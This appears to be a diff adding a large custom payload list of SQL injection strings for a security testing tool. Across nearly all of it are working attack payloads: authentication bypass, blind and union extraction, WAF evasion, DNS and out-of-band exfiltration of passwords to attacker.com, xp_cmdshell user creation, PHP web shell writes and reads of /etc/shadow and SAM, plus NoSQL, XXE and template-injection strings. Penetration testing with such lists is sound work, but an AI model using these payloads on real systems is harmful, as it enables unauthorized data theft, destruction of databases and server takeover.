@@ -1,0 +1,934 @@
+# Custom SQLi Payloads
+# Add your own payloads here for testing
+
+# ============================================
+# TIME-BASED BLIND SQLi PAYLOADS
+# ============================================
+
+# MySQL Time-based
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1' AND SLEEP(5)--
+" AND SLEEP(5)--
+') AND SLEEP(5)--
+") AND SLEEP(5)--
+')) AND SLEEP(5)--
+1 AND SLEEP(5)
+' AND IF(1=1,SLEEP(5),0)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' RLIKE SLEEP(5)--
+' REGEXP SLEEP(5)--
+
+# MSSQL Time-based
+'; WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+'; IF(1=1) WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+") WAITFOR DELAY '0:0:5'--
+
+# PostgreSQL Time-based
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+' || pg_sleep(5)--
+1 AND pg_sleep(5)
+
+# Oracle Time-based
+' AND DBMS_LOCK.SLEEP(5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+# ============================================
+# ERROR-BASED SQLi PAYLOADS
+# ============================================
+
+# MySQL Error-based
+' OR 1=1--
+' AND 1=1--
+' OR '1'='1
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+' AND GTID_SUBSET(version(),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--
+
+# MSSQL Error-based
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CAST(@@version AS int)--
+' UNION SELECT NULL,NULL WHERE 1=CONVERT(int,@@version)--
+
+# PostgreSQL Error-based
+' AND 1=CAST(version() AS int)--
+' AND 1::int=version()::int--
+
+# Oracle Error-based
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--
+
+# ============================================
+# UNION-BASED SQLi PAYLOADS
+# ============================================
+
+# Basic UNION
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+
+# UNION with data extraction
+' UNION SELECT version()--
+' UNION SELECT @@version,NULL--
+' UNION SELECT database(),user()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT CHAR(65),CHAR(66),CHAR(67)--
+
+# Order By technique
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 10--
+' ORDER BY 100--
+
+# ============================================
+# BOOLEAN-BASED BLIND SQLi PAYLOADS
+# ============================================
+
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1' AND '1'='1'--
+1' AND '1'='2'--
+' AND SUBSTRING(version(),1,1)='5'--
+' AND ASCII(SUBSTRING(version(),1,1))>52--
+' AND LENGTH(database())>5--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+# ============================================
+# STACKED QUERIES
+# ============================================
+
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','pass')--
+'; UPDATE users SET password='hacked' WHERE id=1--
+'; EXEC xp_cmdshell('whoami')--
+'; SELECT * FROM users--
+1; SELECT SLEEP(5)--
+
+# ============================================
+# AUTHENTICATION BYPASS PAYLOADS
+# ============================================
+
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin'--
+admin'#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1'--
+') OR ('1'='1
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+admin" OR "1"="1
+admin" OR 1=1--
+' UNION SELECT NULL,NULL WHERE '1'='1
+' OR ''='
+" OR ""="
+
+# ============================================
+# COMMENT-BASED PAYLOADS
+# ============================================
+
+'--
+"--
+'#
+"#
+';--
+";--
+'/*
+"/*
+'%00
+"%00
+'%16
+"%16
+
+# ============================================
+# OUT-OF-BAND (OOB) PAYLOADS
+# ============================================
+
+# MySQL OOB
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\a'))--
+
+# MSSQL OOB
+'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--
+'; EXEC master..xp_fileexist '\\\\attacker.com\\a'--
+
+# Oracle OOB
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version()) FROM dual--
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM dual--
+
+# ============================================
+# SECOND-ORDER SQLi PAYLOADS
+# ============================================
+
+admin'--
+admin' OR '1'='1
+test' UNION SELECT NULL,NULL--
+user' AND SLEEP(5)--
+
+# ============================================
+# WAF BYPASS PAYLOADS
+# ============================================
+
+# Case variation
+' Or 1=1--
+' oR 1=1--
+' AnD 1=1--
+
+# Whitespace obfuscation
+'/**/OR/**/1=1--
+'%09OR%091=1--
+'%0aOR%0a1=1--
+'%0dOR%0d1=1--
+
+# Inline comments
+'/*!OR*/1=1--
+'/*!50000OR*/1=1--
+'/*!12345UNION*//*!12345SELECT*/NULL--
+
+# Encoding
+%27%20OR%201=1--
+%27%20UNION%20SELECT%20NULL--
+%2527%20OR%201=1--
+
+# Double encoding
+%%2727%20OR%201=1--
+
+# URL encoding
+%27+OR+%271%27%3D%271
+%27+UNION+SELECT+NULL--
+
+# ============================================
+# DATABASE-SPECIFIC FINGERPRINTING
+# ============================================
+
+# MySQL
+' AND @@version LIKE '%MySQL%'--
+' AND connection_id()=connection_id()--
+
+# MSSQL
+' AND @@version LIKE '%Microsoft%'--
+' AND SYSTEM_USER=SYSTEM_USER--
+
+# PostgreSQL
+' AND version() LIKE '%PostgreSQL%'--
+' AND current_database()=current_database()--
+
+# Oracle
+' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--
+
+# SQLite
+' AND sqlite_version()=sqlite_version()--
+
+# ============================================
+# ADVANCED EXPLOITATION PAYLOADS
+# ============================================
+
+# Privilege escalation
+' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges--
+' UNION SELECT user,password FROM mysql.user--
+
+# File reading (MySQL)
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--
+
+# File writing (MySQL)
+' UNION SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php'--
+
+# Command execution (MSSQL)
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+
+# ============================================
+# ENHANCED SQLi PAYLOADS - ADDITIONAL
+# ============================================
+
+# ============================================
+# ADVANCED WAF/IDS BYPASS TECHNIQUES
+# ============================================
+
+# Alternative whitespace encoding
+'%0BOR%0B1=1--
+'%0COR%0C1=1--
+'%A0OR%A01=1--
+'%23%0A%0DOR%201=1--
+
+# Unicode encoding
+'%u0027%20OR%201=1--
+'%u0027%20UNION%20SELECT%20NULL--
+%EF%BC%87OR%201=1--
+
+# HTML encoding
+&#39; OR 1=1--
+&#39; UNION SELECT NULL--
+&#x27; OR 1=1--
+
+# Double URL encoding
+%2527%2520OR%25201%253D1--
+%2527%2520UNION%2520SELECT%2520NULL--
+
+# Mixed encoding
+'%u0027%2520OR%25201%253D1--
+
+# SQL comments in unusual places
+'/**/OR/**/1/**/=/**/1--
+'/*!50000OR*/1=1--
+'/*!12345UNION*//*!12345SELECT*/1,2,3--
+SELECT/*!50000*/1/*!50000*/FROM/*!50000*/users--
+
+# Concatenation bypass
+' OR '1'='1' || '1'='1
+' OR CONCAT('1','=','1')--
+' AND CONCAT('a','b')='ab'--
+
+# Hexadecimal encoding
+0x27206f7220313d312d2d
+0x2720756e696f6e2073656c656374206e756c6c2d2d
+
+# CHAR() function encoding
+' OR CHAR(49)=CHAR(49)--
+' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--
+
+# Advanced comment bypass
+'/**_**/OR/**_**/1=1--
+'/*randomtext*/OR/*randomtext*/1=1--
+'/*!12345uNiOn*//*!12345sElEcT*/1,2--
+
+# Line break injection
+'%0AOR%0A1=1%0A--
+'%0DOR%0D1=1%0D--
+'%23%0A%0DOR%201=1--
+
+# Null byte injection
+'%00OR%001=1--
+'%2500OR%25001=1--
+
+# Tabular bypass
+'%09UNION%09SELECT%09NULL--
+'%0BUNION%0BSELECT%0BNULL--
+
+# ============================================
+# POLYGLOT PAYLOADS (MULTI-DB COMPATIBLE)
+# ============================================
+
+# Universal time-based
+'||(SELECT*FROM(SELECT(SLEEP(5)))a)||'
+'||pg_sleep(5)||'
+;WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5) OR '
+1' AND IF(1=1,SLEEP(5),0) OR '
+
+# Universal boolean
+' AND 1=1 AND ''='
+' OR 'a'='a' OR '
+" OR "a"="a" OR "
+
+# Universal error-based
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '
+' OR EXP(~(SELECT*FROM(SELECT version())a)) OR '
+
+# ============================================
+# JSON-BASED SQL INJECTION
+# ============================================
+
+# JSON extraction payloads
+' AND JSON_EXTRACT(@@version,'$[0]')='5'--
+' AND JSON_CONTAINS(@@version, '"MySQL"')--
+' OR JSON_VALUE('{"a":1}', '$.a')=1--
+' UNION SELECT JSON_OBJECT('version',@@version)--
+
+# JSON path injection
+'$.user' OR '1'='1
+' OR JSON_EXTRACT(data, '$.admin')=1--
+' OR JSON_CONTAINS_PATH(data, 'one', '$.privileged')--
+
+# ============================================
+# NO-SQL INJECTION PAYLOADS
+# ============================================
+
+# MongoDB injection
+' || '1'=='1
+'; return true
+' || 1==1
+' && this.password==this.password
+' || this.username!='admin
+
+# Login bypass for MongoDB
+admin' || '1'=='1
+admin' || 1==1//
+admin' || 'a'=='a
+
+# MongoDB operators
+{$ne: null}
+{$gt: ""}
+{$where: "sleep(5000)"}
+
+# ============================================
+# HTTP PARAMETER POLLUTION SQLi
+# ============================================
+
+# Multiple parameter techniques
+?id=1&id=2' UNION SELECT NULL--
+?id[]=1' UNION SELECT NULL--&id[]=2
+?id=1&id=2' OR 1=1--
+
+# Parameter fragmentation
+?id=1' /*&id=*/ UNION /*&id=*/ SELECT NULL--
+?id=1'/**/&id=OR/**/&id=1=1--
+
+# ============================================
+# LDAP INJECTION WITH SQLi
+# ============================================
+
+# Combined LDAP + SQL
+*)(uid=*))(|(uid=*
+admin)(&)
+*)(|(uid=*))(|(uid=*
+')(uid=*))(|(uid=* '
+
+# LDAP filter injection
+*)(objectClass=*))(&(uid=admin)(password=*
+)(uid=*))%00
+
+# ============================================
+# XPATH INJECTION PAYLOADS
+# ============================================
+
+# XPath injection basics
+' or '1'='1
+' or ''='
+//user[username='admin' or '1'='1' and password='anything']
+
+# XPath blind injection
+' or string-length(username)=5 or '
+' or substring(username,1,1)='a' or '
+
+# ============================================
+# XXE + SQLi COMBINED
+# ============================================
+
+# XXE triggering SQL
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=config.php">
+
+# ============================================
+# DOM-BASED SQL INJECTION
+# ============================================
+
+# JavaScript SQLi contexts
+'); DROP TABLE users;--
+'); OR 1=1;//
+'); UNION SELECT NULL;--
+
+# AngularJS injection
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+
+# ============================================
+# SECOND-ORDER ADVANCED PAYLOADS
+# ============================================
+
+# Registration form second-order
+' UNION SELECT 'admin','hashedpass',1--
+' WHERE NOT EXISTS (SELECT * FROM users WHERE username='admin')--
+
+# Profile update second-order
+', password=(SELECT password FROM users WHERE username='admin') WHERE username='victim'--
+', email='hacker@evil.com' WHERE username='admin'--
+
+# ============================================
+# HEADER-BASED SQL INJECTION
+# ============================================
+
+# User-Agent injection
+User-Agent: ' OR 1=1--
+User-Agent: ' UNION SELECT NULL,NULL--
+
+# X-Forwarded-For injection
+X-Forwarded-For: 127.0.0.1' OR 1=1--
+X-Forwarded-For: ' UNION SELECT @@version,NULL--
+
+# Referer injection
+Referer: https://site.com/' OR 1=1--
+Referer: ' UNION SELECT database(),user()--
+
+# ============================================
+# COOKIE-BASED SQL INJECTION
+# ============================================
+
+# Cookie payloads
+Cookie: session=' OR 1=1--
+Cookie: user_id=1' UNION SELECT NULL--
+Cookie: auth=' AND SLEEP(5)--
+
+# ============================================
+# FILE UPLOAD + SQLi
+# ============================================
+
+# Filename injection
+file' OR '1'='1.jpg
+file'; DROP TABLE users;--.jpg
+
+# Metadata injection (EXIF)
+EXIF: ' OR 1=1--
+EXIF: ' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+# ============================================
+# EMAIL INJECTION PAYLOADS
+# ============================================
+
+# Email field SQLi
+' OR 1=1--@evil.com
+admin' OR '1'='1'--@domain.com
+' UNION SELECT NULL,NULL,NULL--@test.com
+
+# ============================================
+# SEARCH FUNCTION SQL INJECTION
+# ============================================
+
+# Search field payloads
+%' OR 1=1--
+%' UNION SELECT NULL,NULL--
+test%' AND SLEEP(5) AND '%'='
+
+# Wildcard search injection
+*' OR 1=1--
+*' UNION SELECT @@version--
+_%' OR 1=1--
+
+# ============================================
+# ORDER BY INJECTION (ADVANCED)
+# ============================================
+
+# Conditional order by
+(CASE WHEN (1=1) THEN column1 ELSE column2 END)
+(CASE WHEN (SELECT SUBSTRING(@@version,1,1)='5') THEN id ELSE name END)
+
+# Time-based order by
+IF(1=1,SLEEP(5),0)
+(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)
+
+# Error-based order by
+(CAST((SELECT @@version) AS INT))
+(EXP(~(SELECT * FROM (SELECT @@version)x)))
+
+# ============================================
+# LIMIT/OFFSET INJECTION
+# ============================================
+
+# Limit clause injection
+LIMIT 0,1 UNION SELECT @@version
+LIMIT 1 OFFSET 0) UNION SELECT NULL--
+LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,@@version)),1)
+
+# ============================================
+# GROUP BY/HAVING INJECTION
+# ============================================
+
+# Group by injection
+GROUP BY column1 HAVING 1=1--
+GROUP BY (SELECT @@version)--
+GROUP BY 1 UNION SELECT @@version--
+
+# Having clause injection
+HAVING 1=1--
+HAVING (SELECT @@version)='MySQL'--
+HAVING SLEEP(5)--
+
+# ============================================
+# SUBQUERY INJECTION PAYLOADS
+# ============================================
+
+# WHERE clause subquery
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--
+
+# SELECT clause subquery
+SELECT (SELECT @@version) FROM dual
+SELECT (SELECT password FROM users WHERE id=1) FROM users
+
+# FROM clause subquery
+SELECT * FROM (SELECT @@version)a
+SELECT * FROM (SELECT * FROM users UNION SELECT 1,2,3)b
+
+# ============================================
+# STORED PROCEDURE INJECTION
+# ============================================
+
+# MSSQL procedures
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
+'; EXEC xp_cmdshell 'net user hacker Password123 /add'--
+'; EXEC master..xp_dirtree '\\attacker\share'--
+
+# MySQL procedures
+'; CREATE PROCEDURE attack() BEGIN SELECT * FROM users; END;--
+'; CALL attack();--
+
+# Oracle procedures
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+'; EXECUTE IMMEDIATE 'SELECT * FROM users';--
+
+# ============================================
+# TRIGGER-BASED PERSISTENCE
+# ============================================
+
+# MySQL trigger injection
+'; CREATE TRIGGER backdoor BEFORE INSERT ON users FOR EACH ROW BEGIN SELECT * FROM information_schema.tables; END;--
+
+# ============================================
+# DNS EXFILTRATION PAYLOADS
+# ============================================
+
+# DNS exfiltration (MySQL)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.attacker.com\\test'))--
+
+# DNS exfiltration (MSSQL)
+'; DECLARE @data VARCHAR(1024); SET @data=(SELECT password FROM users); EXEC('master..xp_dirtree ''\\'+@data+'.attacker.com\test''');--
+
+# ============================================
+# DATA EXFILTRATION ENCODING
+# ============================================
+
+# Hex encoding exfiltration
+' UNION SELECT CONCAT('0x',HEX(password)) FROM users--
+' AND ASCII(SUBSTRING(password,1,1))>0--
+
+# Base64 encoding exfiltration
+' UNION SELECT TO_BASE64(password) FROM users--
+' AND ORD(SUBSTRING(password,1,1))>0--
+
+# Binary encoding
+' UNION SELECT BIN(password) FROM users--
+' AND BINARY(password)='admin'--
+
+# ============================================
+# PRIVILEGE ESCALATION ADVANCED
+# ============================================
+
+# Read files with privileges
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+' UNION SELECT LOAD_FILE('C:/Windows/win.ini')--
+
+# Write files for RCE
+' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php eval($_POST["cmd"]); ?>' INTO DUMPFILE '/var/www/html/b.php'--
+
+# Read registry (Windows)
+' UNION SELECT LOAD_FILE('C:/Windows/System32/config/SAM')--
+
+# ============================================
+# DATABASE FINGERPRINTING (ADVANCED)
+# ============================================
+
+# Version detection with conditional responses
+' AND @@version LIKE '%10.%'--
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+
+# Database user detection
+' AND CURRENT_USER='root@localhost'--
+' AND USER() LIKE '%root%'--
+
+# Database name detection
+' AND DATABASE()='app_db'--
+' AND (SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1)='information_schema'--
+
+# ============================================
+# BLIND SQLi OPTIMIZATION
+# ============================================
+
+# Binary search for faster extraction
+' AND ASCII(SUBSTRING(password,1,1))>128--
+' AND ASCII(SUBSTRING(password,1,1)) BETWEEN 97 AND 122--
+
+# Bit-by-bit extraction
+' AND (ASCII(SUBSTRING(password,1,1)) >> 1 & 1)=1--
+' AND (ORD(SUBSTRING(password,1,1)) & 128)=128--
+
+# ============================================
+# POLYMORPHIC PAYLOADS (EVADING SIGNATURES)
+# ============================================
+
+# Random case mutation
+' oR 1=1--
+' uNiOn sElEcT nUlL--
+' aNd SlEeP(5)--
+
+# Random whitespace
+'   OR   1   =   1  --
+'UNION
+SELECT
+NULL--
+
+# Random comments
+'/**/OR/**/1/**/=/**/1/**/--
+'/*xyz*/UNION/*xyz*/SELECT/*xyz*/NULL/*xyz*/--
+
+# String concatenation
+' OR '1'='1'+'1'--
+' OR CONCAT('1','=','1')--
+
+# ============================================
+# API-BASED SQL INJECTION
+# ============================================
+
+# GraphQL injection
+{"query":"query { user(id:\"1' OR 1=1--\") { id name } }"}
+mutation { updateUser(id:\"1'; DROP TABLE users--\", name:\"hacker\") }
+
+# REST API injection
+GET /api/users?id=1' OR 1=1--
+POST /api/login {"username":"admin'--", "password":"anything"}
+
+# SOAP injection
+<userID>1' OR 1=1--</userID>
+<username>admin' UNION SELECT @@version--</username>
+
+# ============================================
+# MOBILE APP SQL INJECTION
+# ============================================
+
+# SQLite mobile payloads
+' OR 1=1--
+' UNION SELECT sql FROM sqlite_master--
+' AND (SELECT sqlite_version())='3.36.0'--
+
+# Firebase/Realm injection
+' OR 1==1//
+' || true//
+
+# ============================================
+# IOT/EMBEDDED SQL INJECTION
+# ============================================
+
+# SQLite on IoT
+' OR 1=1;--
+' UNION SELECT name FROM sqlite_master WHERE type='table';--
+
+# ============================================
+# CLOUD DATABASE PAYLOADS
+# ============================================
+
+# AWS RDS/Aurora
+' UNION SELECT * FROM mysql.rds_heartbeat2--
+' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>0--
+
+# Azure SQL
+' UNION SELECT * FROM sys.databases--
+' AND (SELECT @@VERSION) LIKE '%Azure%'--
+
+# Google Cloud SQL
+' UNION SELECT * FROM information_schema.tables WHERE table_schema=SCHEMA()--
+
+# ============================================
+# ORM INJECTION PAYLOADS
+# ============================================
+
+# Hibernate HQL injection
+' OR 1=1
+' OR '1'='1' OR '
+' UNION SELECT NULL FROM users--
+
+# ActiveRecord injection
+') OR 1=1--
+') UNION SELECT NULL--
+
+# ============================================
+# PREPARED STATEMENT BYPASS
+# ============================================
+
+# Parameter manipulation
+1; DROP TABLE users--
+1' OR '1'='1
+
+# LIKE clause injection
+%' OR 1=1--
+_' OR '1'='1
+
+# IN clause injection
+1) OR 1=1--
+(1) OR (1)=(1)
+
+# ============================================
+# JSON PATH INJECTION (ADVANCED)
+# ============================================
+
+# JSON path traversal
+$.users[0].password
+$.users[?(@.username=='admin')].password
+$[0].password
+
+# JSON path with SQL
+' OR JSON_EXTRACT(data, '$[0].admin')=1--
+' AND JSON_CONTAINS_PATH(data, 'one', '$.privileged.*')--
+
+# ============================================
+# TEMPLATE INJECTION + SQLi
+# ============================================
+
+# Twig + SQL
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Jinja2 + SQL
+{{ config.items() }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+
+# ============================================
+# CSRF + SQLi COMBINED
+# ============================================
+
+# CSRF with SQL payload
+<form action="http://victim.com/update" method="POST">
+  <input type="hidden" name="id" value="1'; DROP TABLE users--">
+  <input type="hidden" name="name" value="hacked">
+</form>
+
+# ============================================
+# SSTI + SQLi COMBINED
+# ============================================
+
+# Template engine injection
+${7*7}
+#{7*7}
+{{7*7}}
+<%= 7*7 %>
+
+# Combined with SQL
+{{'a'.getClass().forName('java.lang.Runtime').getMethod('exec','id').invoke('a'.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}
+
+# ============================================
+# AUTOMATED FUZZING PAYLOADS
+# ============================================
+
+# Quick test payloads
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1'--
+" OR "1"="1"--
+1 OR 1=1
+1' OR '1'='1
+1" OR "1"="1
+1 OR 1=1--
+1' OR '1'='1'--
+1" OR "1"="1"--
+
+# ============================================
+# DEFENSE EVASION PAYLOADS
+# ============================================
+
+# Obfuscated payloads
+'/**/OR/**/1/**/=/**/1
+'%0AOR%0A1%3D1
+'%0DOR%0D1%3D1
+'%09OR%091%3D1
+'%0COR%0C1%3D1
+'%0BOR%0B1%3D1
+'%A0OR%A01%3D1
+
+# Mixed encoding
+%2527%2520OR%25201%253D1
+%u0027%20OR%201=1
+&#39; OR 1=1
+
+# ============================================
+# LOGIC BOMB PAYLOADS
+# ============================================
+
+# Time-based logic bomb
+' AND IF(HOUR(NOW())=9, SLEEP(30), 0)--
+' AND IF(DAYOFWEEK(NOW())=1, SLEEP(60), 0)--
+
+# Conditional data extraction
+' AND IF((SELECT COUNT(*) FROM users)>100, SLEEP(5), 0)--
+' AND IF((SELECT password FROM users WHERE username='admin')='secret', SLEEP(10), 0)--
+
+# ============================================
+# PIVOTING PAYLOADS
+# ============================================
+
+# Database link exploitation (Oracle)
+SELECT * FROM users@database_link
+SELECT * FROM ALL_DB_LINKS
+
+# Linked server (MSSQL)
+SELECT * FROM OPENQUERY(LINKEDSERVER, 'SELECT * FROM users')
+EXEC ('SELECT * FROM users') AT LINKEDSERVER
+
+# ============================================
+# ENCRYPTION/DECRYPTION ATTACKS
+# ============================================
+
+# MySQL encryption functions
+' AND AES_DECRYPT(password, 'key')='admin'--
+' UNION SELECT ENCRYPT('test')--
+
+# Password hash attacks
+' AND password=MD5('admin')--
+' UNION SELECT SHA1('test')--
+
+# ============================================
+# RESOURCE EXHAUSTION ATTACKS
+# ============================================
+
+# Heavy queries
+' AND BENCHMARK(10000000,MD5('test'))--
+' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
+
+# Recursive queries
+WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r) SELECT n FROM r LIMIT 1000000
+
+# ============================================
+# ERROR-BASED ENHANCED
+# ============================================
+
+# MySQL error with subquery
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# PostgreSQL error
+' AND 1=CAST((SELECT version()) AS NUMERIC)--
+
+# MSSQL error with conversion
+' AND 1=CONVERT(INT,(SELECT @@version))--
+
+# ============================================
+# FINAL NOTES
+# ============================================
+
+# ALWAYS TEST ETHICALLY AND WITH PERMISSION
+# These payloads are for educational and authorized testing only
+# Unauthorized testing is illegal and unethical
